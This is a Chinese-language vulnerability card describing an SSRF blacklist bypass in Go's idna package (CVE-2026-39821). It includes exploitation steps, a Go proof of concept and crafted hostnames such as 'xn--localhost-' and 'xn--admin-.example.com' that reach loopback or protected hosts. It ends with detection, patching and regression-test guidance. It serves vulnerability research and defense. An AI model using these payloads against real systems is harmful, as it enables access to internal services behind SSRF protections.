---
id: web-generic-ssrf-golang-idna-ascii-punycode-blacklist-bypass
title: Go idna 尾分隔符构造绕过 SSRF 黑名单访问回环地址
type: scenario
domain: web
path: web/generic/ssrf
technique: idna-normalization-blacklist-bypass
aliases:
- xn--localhost- SSRF
- CVE-2026-39821 SSRF
- idna 黑名单绕过
- Punycode 纯 ASCII 标签
- IDN 规范化绕过
tags:
- ssrf
- go
- idna
- punycode
- blacklist
- localhost
- normalization
- cve-2026-39821
cve:
- CVE-2026-39821
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: golang.org/x/net < v0.57.0（v0.54.0–v0.56.0 实测受影响），且工具链 unicode.Version < 16.0.0
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:51:02+08:00'
  notes: 已对照原文与22张图核对；黑名单先于规范化、xn--localhost- 经 idna.Lookup.ToASCII 还原为 localhost、真实请求到达 127.0.0.1:18080、修复版返回 err、标准库直拨 DNS 失败均与原文一致；未本地复现
---

## 一句话结论

当 SSRF 防护直接比较原始 hostname 黑名单、而业务随后用 Go `idna` 做规范化时，`xn--localhost-` 能绕过 `localhost` 黑名单，被 `idna.Lookup.ToASCII` 还原成 `localhost` 且不报错，请求最终真实到达 `127.0.0.1`。

## 原理

- 校验阶段拿到的是原始字符串：`url.Parse("http://xn--localhost-:18080/ping").Hostname()` 等于 `xn--localhost-`，与黑名单中的 `localhost` 不相等，检查放行。
- 执行阶段调用 `idna.Lookup.ToASCII(host)`。在 `golang.org/x/net < v0.57.0` 且工具链 `unicode.Version < 16.0.0` 的环境下，`decode` 把 `localhost-` 整体当作 Punycode 的 basic 段，去掉尾 `-` 返回 `localhost`，同时错误为 `nil`。
- 根因是 UTS #46 早期修订没有把“解码结果为纯 ASCII 的 `xn--` 标签”定义为错误，而 `idna` 的兜底检查又被编译期常量 `unicode16` 短路（详见 `[[web-golang-golang-idna-ascii-punycode-validation-bypass]]`）。
- 于是“校验看到 A、执行使用 B”：黑名单看的是 `xn--localhost-`，网络请求打的是 `localhost`。这是校验前后表示不一致导致的 SSRF 黑名单绕过，而非 DNS 或 IP 表示问题。
- 标准库 `net/http` 裸拨号对这条构造免疫：`idnaASCII` 与 `PunycodeHostPort` 都先做 `ascii.Is` 短路，纯 ASCII 输入原样返回，`xn--localhost-` 的 DNS 解析会失败。绕过必须经过应用层自己的 `idna` 调用。

## 触发条件

- 应用提供“按用户 URL 抓取/代理/预览/Webhook/导入”的功能，且对 hostname 做黑名单校验。
- 校验发生在规范化之前，或校验只比较原始字符串。
- 后续流程用 `idna.ToASCII`/`idna.ToUnicode`/`idna.Lookup.ToASCII` 规范化 hostname，并且不检查 `err` 或只检查返回值。
- 依赖 `golang.org/x/net < v0.57.0`，工具链标准库 `unicode.Version < 16.0.0`。
- 目标回环或内网服务可达；目标以域名形态表达（纯 IP 字面量的 `xn--` 构造会因数字标签校验失败）。

## 利用步骤

1. 确认功能会代用户发起 HTTP 请求，先用 `http://127.0.0.1:PORT/` 验证黑名单确实拦截。
2. 提交 `http://xn--localhost-:PORT/path`。原始 hostname 与黑名单不等，校验放行。
3. 若应用随后调用 `idna` 规范化且未拦截错误，目标变成 `http://localhost:PORT/path`，请求真实发出。
4. 通过响应内容、响应时间或回连确认到达回环服务；服务端看到的 Host 头会是 `localhost:PORT`。
5. 将 `localhost` 替换为其他被黑名单保护的域名标签，例如 `xn--admin-.example.com` 解码为 `admin.example.com`；云元数据等以域名形式提供的目标同理，具体是否可达取决于目标环境。

## PoC

```go
package main

import (
	"fmt"
	"net/http"
	"net/url"

	"golang.org/x/net/idna"
)

func main() {
	raw := "http://xn--localhost-:18080/ping"
	u, _ := url.Parse(raw)
	host := u.Hostname()

	// 校验：原始字符串黑名单
	if host == "localhost" {
		fmt.Println("blocked")
		return
	}
	fmt.Printf("blacklist miss: %q\n", host)

	// 执行：应用层规范化
	norm, err := idna.Lookup.ToASCII(host)
	if err != nil {
		fmt.Println("normalize error:", err)
		return
	}
	fmt.Printf("normalized: %q\n", norm)

	_, err = http.Get("http://" + norm + ":18080/ping")
	fmt.Println("request err:", err)
}
```

- 漏洞版本（go1.26.8 + x/net v0.54.0）：输出 `blacklist miss: "xn--localhost-"`、`normalized: "localhost"`，请求到达 `127.0.0.1:18080`，服务端收到 `Host: localhost:18080`。
- 修复版本（x/net v0.57.0）：`normalized` 仍为 `localhost`，但 `err=idna: invalid label "localhost-"`，按错误拒绝后请求不会发出。
- 对照：直接把 `http://xn--localhost-:18080/ping` 交给标准库 `http.Get`，报 `lookup xn--localhost-: no such host`，证明标准库拨号路径不是入口。

## 变体与关联

- 白名单方向：校验先规范化再比对时，`xn--allowed-.example.com` 被还原为 `allowed.example.com` 并命中白名单，外部请求被当成可信目标。
- 回调方向：OAuth `redirect_uri`、Webhook 域名校验若先 `idna` 规范化再比对，同构造可把畸形标签当作合法回调域名；是否成立取决于具体业务实现。
- 前缀必须小写；`XN--LOCALHOST-` 不会被识别为 ACE。
- 纯 IP 目标不可直接套用：`xn--169.254.169.254-` 会被点号切分成多个标签，数字标签触发 `invalid label "169"`；需要改用目标服务的域名形态。
- 共享同一原语但落点不同的提权/授权判断：通告列为方向，公开材料无独立利用链，本卡不展开。
- 关联：`[[web-golang-golang-idna-ascii-punycode-validation-bypass]]` 讲库层缺陷与版本判定；`[[web-generic-ssrf-ip-notation-blacklist-bypass]]` 讲同一 IP 的等价字面量；`[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]` 讲校验与执行解析器分歧。三者都属于“判断时看到的不是实际连接的目标”。

## 检测与防御

- 请求侧检测：hostname 中出现 `xn--` 且标签以 `-` 结尾（如 `xn--localhost-`、`xn--admin-.example.com`），尤其是紧邻被保护域名标签时。
- 流量侧检测：业务服务器向回环、RFC 1918 私网、链路本地地址发起连接；内网服务日志出现来自业务服务器的异常 Host 头（如 `localhost`）。
- 修复：升级 `golang.org/x/net` 到 v0.57.0 及以上，并按标准库修复版本升级工具链；两条都满足才有效。
- 修复：所有 `idna` 调用必须检查 `err`，出错即拒绝；同时注意修复版本仍会返回原字符串，不能只看返回值。
- 结构加固：先规范化，再基于规范化后的唯一结果做校验和实际请求，避免“先放行、后规范化”；对 `xn--` 标签要求解码结果不得为纯 ASCII。
- 纵深防御：真正连接前解析出 IP，拒绝回环、私网、链路本地 `169.254.0.0/16`；把校验时的解析结果固定为连接时使用的 IP，防止 DNS 重绑定；出站流量默认拒绝。
- 回归测试：把 `xn--localhost-`、`xn--admin-.example.com`、`xn--example-.com` 写成必须拒绝的用例，而不是只断言 hostname 等于某个字面量。
